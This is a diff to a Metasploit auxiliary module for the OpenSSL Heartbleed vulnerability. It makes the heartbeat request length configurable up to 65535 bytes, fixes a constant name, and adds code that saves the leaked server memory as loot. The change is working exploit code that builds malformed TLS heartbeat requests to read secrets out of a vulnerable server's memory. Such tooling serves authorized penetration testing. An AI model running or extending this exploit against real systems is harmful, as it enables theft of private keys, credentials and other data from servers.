@@ -74,7 +74,7 @@ class Metasploit3 < Msf::Auxiliary
     '1.2' => 0x0303
   }
 
-  TTLS_CALLBACKS = {
+  TLS_CALLBACKS = {
     'SMTP'   => :tls_smtp,
     'IMAP'   => :tls_imap,
     'JABBER' => :tls_jabber,
@@ -124,9 +124,23 @@ class Metasploit3 < Msf::Auxiliary
 
     register_advanced_options(
       [
+        OptInt.new("HEARTBEAT_LENGTH", [true, "Heartbeat length", 65535]),
         OptString.new('XMPPDOMAIN', [ true, 'The XMPP Domain to use when Jabber is selected', 'localhost' ])
       ], self.class)
 
+  end
+
+  def run
+    if heartbeat_length > 65535
+      print_error("HEARTBEAT_LENGTH should be less than 65536")
+      return
+    end
+
+    super
+  end
+
+  def heartbeat_length
+    datastore["HEARTBEAT_LENGTH"]
   end
 
   def peer
@@ -197,7 +211,7 @@ class Metasploit3 < Msf::Auxiliary
 
     unless datastore['STARTTLS'] == 'None'
       vprint_status("#{peer} - Trying to start SSL via #{datastore['STARTTLS']}")
-      res = self.send(TTLS_CALLBACKS[datastore['STARTTLS']])
+      res = self.send(TLS_CALLBACKS[datastore['STARTTLS']])
       if res.nil?
         vprint_error("#{peer} - STARTTLS failed...")
         return
@@ -214,7 +228,6 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     vprint_status("#{peer} - Sending Heartbeat...")
-    heartbeat_length = 16384
     sock.put(heartbeat(heartbeat_length))
     hdr = sock.get_once(5)
     if hdr.blank?
@@ -261,7 +274,16 @@ class Metasploit3 < Msf::Auxiliary
         :refs => self.references,
         :info => "Module #{self.fullname} successfully leaked info"
       })
+      path = store_loot(
+        "openssl.heartbleed.server",
+        "application/octet-stream",
+        ip,
+        heartbeat_data,
+        nil,
+        "OpenSSL Heartbleed server memory"
+      )
       vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
+      print_status("#{peer} - Heartbeat data stored in #{path}")
     else
       vprint_error("#{peer} - Looks like there isn't leaked information...")
     end
@@ -269,7 +291,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def heartbeat(length)
     payload = "\x01"              # Heartbeat Message Type: Request (1)
-    payload << [length].pack("n") # Payload Length: 16384
+    payload << [length].pack("n") # Payload Length: 65535
 
     ssl_record(HEARTBEAT_RECORD_TYPE, payload)
   end
